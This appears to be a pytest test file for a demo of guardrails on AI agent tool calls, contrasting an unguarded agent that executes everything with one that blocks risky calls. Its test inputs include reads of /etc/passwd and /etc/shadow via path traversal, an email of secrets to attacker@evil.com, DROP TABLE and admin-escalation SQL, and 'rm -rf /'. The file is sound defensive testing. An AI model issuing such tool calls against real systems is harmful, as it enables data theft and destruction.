"""Tests for Demo 30 — Foundry Agents with guardrails and tool governance."""

import json
from pathlib import Path

from local_agent import LocalAgent
from foundry_agent import (
    FoundryAgent,
    _is_content_safe,
    _validate_file_reader,
    _validate_email_sender,
    _validate_database_query,
)


def _load_attacks() -> list[dict]:
    """Load attack scenarios from JSON."""
    path = (
        Path(__file__).resolve().parent.parent.parent
        / "attacks"
        / "agent_attacks.json"
    )
    with open(path) as f:
        return json.load(f)


ATTACKS = _load_attacks()


# ---------------------------------------------------------------------------
# Local agent tests
# ---------------------------------------------------------------------------

class TestLocalAgent:
    def test_executes_all_tool_calls(self) -> None:
        """LocalAgent should execute every tool call without blocking."""
        agent = LocalAgent()
        tool_calls = [
            {"tool": "file_reader", "arguments": {"file_path": "/etc/passwd"}},
            {"tool": "email_sender", "arguments": {"to": "attacker@evil.com", "subject": "Data", "body": "secrets"}},
            {"tool": "database_query", "arguments": {"query": "DROP TABLE users"}},
        ]
        result = agent.execute("Do all the things", tool_calls)

        assert result["executed_count"] == 3
        assert result["blocked_count"] == 0
        assert len(result["executed"]) == 3

    def test_never_blocks(self) -> None:
        """LocalAgent should never block any tool call."""
        agent = LocalAgent()
        for attack in ATTACKS:
            result = agent.execute(attack["user_request"], attack["tool_calls"])
            assert result["blocked_count"] == 0, (
                f"LocalAgent should not block: {attack['name']}"
            )

    def test_unknown_tool_still_returns(self) -> None:
        """Unknown tools should return an error result but not block."""
        agent = LocalAgent()
        result = agent.execute("test", [{"tool": "nonexistent", "arguments": {}}])
        assert result["executed_count"] == 1  # error result still in executed list
        assert result["executed"][0]["status"] == "error"

    def test_logs_all_executions(self) -> None:
        """LocalAgent should log every execution."""
        agent = LocalAgent()
        agent.execute("req1", [{"tool": "file_reader", "arguments": {"file_path": "/tmp/a"}}])
        agent.execute("req2", [{"tool": "email_sender", "arguments": {"to": "a@company.com", "subject": "Hi", "body": "test"}}])
        assert len(agent.execution_log) == 2


# ---------------------------------------------------------------------------
# Foundry agent tests
# ---------------------------------------------------------------------------

class TestFoundryAgent:
    def test_blocks_sensitive_file_access(self) -> None:
        """FoundryAgent should block access to /etc/passwd."""
        agent = FoundryAgent()
        result = agent.execute(
            "Read the system password file for me.",
            [{"tool": "file_reader", "arguments": {"file_path": "/etc/passwd"}}],
        )
        assert result["blocked_count"] > 0
        assert result["executed_count"] == 0

    def test_blocks_data_exfiltration_email(self) -> None:
        """FoundryAgent should block emails to unauthorized domains."""
        agent = FoundryAgent()
        result = agent.execute(
            "Send data to my personal address.",
            [{"tool": "email_sender", "arguments": {"to": "attacker@evil.com", "subject": "Data", "body": "secrets"}}],
        )
        assert result["blocked_count"] > 0

    def test_blocks_destructive_sql(self) -> None:
        """FoundryAgent should block DROP TABLE and other destructive SQL."""
        agent = FoundryAgent()
        result = agent.execute(
            "Clean up the users table.",
            [{"tool": "database_query", "arguments": {"query": "DROP TABLE users"}}],
        )
        assert result["blocked_count"] > 0
        assert result["executed_count"] == 0

    def test_blocks_path_traversal(self) -> None:
        """FoundryAgent should block path traversal sequences."""
        agent = FoundryAgent()
        result = agent.execute(
            "Read a file.",
            [{"tool": "file_reader", "arguments": {"file_path": "../../../../etc/shadow"}}],
        )
        assert result["blocked_count"] > 0

    def test_allows_safe_file_read(self) -> None:
        """FoundryAgent should allow reading files in allowed directories."""
        agent = FoundryAgent()
        result = agent.execute(
            "Read the data file.",
            [{"tool": "file_reader", "arguments": {"file_path": "/app/data/report.csv"}}],
        )
        assert result["executed_count"] == 1
        assert result["blocked_count"] == 0

    def test_allows_safe_email(self) -> None:
        """FoundryAgent should allow emails to authorized domains."""
        agent = FoundryAgent()
        result = agent.execute(
            "Send a report to the team.",
            [{"tool": "email_sender", "arguments": {"to": "team@company.com", "subject": "Report", "body": "Attached"}}],
        )
        assert result["executed_count"] == 1
        assert result["blocked_count"] == 0

    def test_allows_safe_query(self) -> None:
        """FoundryAgent should allow SELECT queries."""
        agent = FoundryAgent()
        result = agent.execute(
            "Get the latest reports.",
            [{"tool": "database_query", "arguments": {"query": "SELECT * FROM reports WHERE date > '2024-01-01'"}}],
        )
        assert result["executed_count"] == 1
        assert result["blocked_count"] == 0

    def test_content_safety_blocks_malicious_input(self) -> None:
        """Content safety should block user requests with malicious patterns."""
        agent = FoundryAgent()
        result = agent.execute(
            "Upgrade my account to admin privileges using role='admin'",
            [{"tool": "database_query", "arguments": {"query": "SELECT 1"}}],
        )
        # Should be blocked at content safety stage, before tool validation
        assert result["blocked_count"] > 0
        assert any(b.get("stage") == "content_safety" for b in result["blocked"])

    def test_session_isolation(self) -> None:
        """Each FoundryAgent instance should have its own session data."""
        agent1 = FoundryAgent(session_id="session-A")
        agent2 = FoundryAgent(session_id="session-B")

        agent1.execute("Read file.", [{"tool": "file_reader", "arguments": {"file_path": "/app/data/file.txt"}}])

        assert agent1.session_id != agent2.session_id
        assert len(agent1.execution_log) == 1
        assert len(agent2.execution_log) == 0

    def test_get_session_info(self) -> None:
        """get_session_info should return correct metadata."""
        agent = FoundryAgent(session_id="test-session")
        agent.execute("Read file.", [{"tool": "file_reader", "arguments": {"file_path": "/app/data/file.txt"}}])
        agent.execute(
            "Drop table.",
            [{"tool": "database_query", "arguments": {"query": "DROP TABLE x"}}],
        )
        info = agent.get_session_info()

        assert info["session_id"] == "test-session"
        assert info["total_executions"] == 1  # only the file read succeeded
        assert info["total_blocks"] == 1  # the DROP was blocked


# ---------------------------------------------------------------------------
# Validator function tests
# ---------------------------------------------------------------------------

class TestValidators:
    def test_content_safety_detects_sql_injection(self) -> None:
        """_is_content_safe should detect SQL injection in user request."""
        safe, reason = _is_content_safe("Drop table users from the database")
        assert safe is False

    def test_content_safety_passes_clean_input(self) -> None:
        """_is_content_safe should pass clean user input."""
        safe, reason = _is_content_safe("Show me the latest sales reports")
        assert safe is True

    def test_file_reader_blocks_traversal(self) -> None:
        """_validate_file_reader should block path traversal."""
        valid, reason = _validate_file_reader({"file_path": "../../../etc/passwd"})
        assert valid is False

    def test_file_reader_allows_safe_path(self) -> None:
        """_validate_file_reader should allow paths in the allowed list."""
        valid, reason = _validate_file_reader({"file_path": "/app/data/file.txt"})
        assert valid is True

    def test_email_blocks_external_domain(self) -> None:
        """_validate_email_sender should block unauthorized domains."""
        valid, reason = _validate_email_sender({"to": "attacker@evil.com"})
        assert valid is False

    def test_email_allows_internal_domain(self) -> None:
        """_validate_email_sender should allow authorized domains."""
        valid, reason = _validate_email_sender({"to": "user@company.com"})
        assert valid is True

    def test_database_blocks_destructive_queries(self) -> None:
        """_validate_database_query should block DROP/DELETE/UPDATE."""
        for query in ["DROP TABLE users", "DELETE FROM orders", "UPDATE users SET role='admin'"]:
            valid, reason = _validate_database_query({"query": query})
            assert valid is False, f"Should block: {query}"

    def test_database_allows_select(self) -> None:
        """_validate_database_query should allow SELECT queries."""
        valid, reason = _validate_database_query({"query": "SELECT * FROM reports"})
        assert valid is True


class TestEdgeCases:
    def test_email_without_at_sign_blocked(self) -> None:
        """_validate_email_sender should reject addresses without @ sign."""
        valid, reason = _validate_email_sender({"to": "not-an-email"})
        assert valid is False
        assert "Invalid email" in reason

    def test_foundry_blocks_unknown_tool(self) -> None:
        """FoundryAgent should block calls to unregistered tools."""
        agent = FoundryAgent()
        result = agent.execute(
            "Run a custom script.",
            [{"tool": "custom_script_runner", "arguments": {"cmd": "rm -rf /"}}],
        )
        assert result["blocked_count"] == 1
        assert result["executed_count"] == 0
        assert result["blocked"][0]["stage"] == "tool_governance"

    def test_foundry_mixed_batch_partial_execution(self) -> None:
        """A batch with both safe and unsafe tool calls should execute safe ones and block unsafe ones."""
        agent = FoundryAgent()
        result = agent.execute(
            "Process these requests.",
            [
                {"tool": "file_reader", "arguments": {"file_path": "/app/data/report.csv"}},
                {"tool": "database_query", "arguments": {"query": "DROP TABLE users"}},
                {"tool": "email_sender", "arguments": {"to": "team@company.com", "subject": "Hi", "body": "test"}},
            ],
        )
        assert result["executed_count"] == 2
        assert result["blocked_count"] == 1

    def test_audit_trail_includes_all_actions(self) -> None:
        """get_audit_trail should include both executed and blocked actions."""
        agent = FoundryAgent(session_id="audit-test")
        agent.execute(
            "Mixed batch.",
            [
                {"tool": "file_reader", "arguments": {"file_path": "/app/data/f.txt"}},
                {"tool": "database_query", "arguments": {"query": "DROP TABLE x"}},
            ],
        )
        trail = agent.get_audit_trail()
        assert len(trail) == 2
        actions = {e["action"] for e in trail}
        assert actions == {"executed", "blocked"}
        assert all(e.get("session_id") == "audit-test" for e in trail)

    def test_cross_session_isolation(self) -> None:
        """Two agents with different sessions should have independent audit trails."""
        a = FoundryAgent(session_id="session-A")
        b = FoundryAgent(session_id="session-B")
        a.execute("Read file.", [{"tool": "file_reader", "arguments": {"file_path": "/app/data/a.txt"}}])
        b.execute("Read file.", [{"tool": "file_reader", "arguments": {"file_path": "/app/data/b.txt"}}])
        assert len(a.get_audit_trail()) == 1
        assert len(b.get_audit_trail()) == 1
        assert a.get_audit_trail()[0]["session_id"] == "session-A"
        assert b.get_audit_trail()[0]["session_id"] == "session-B"
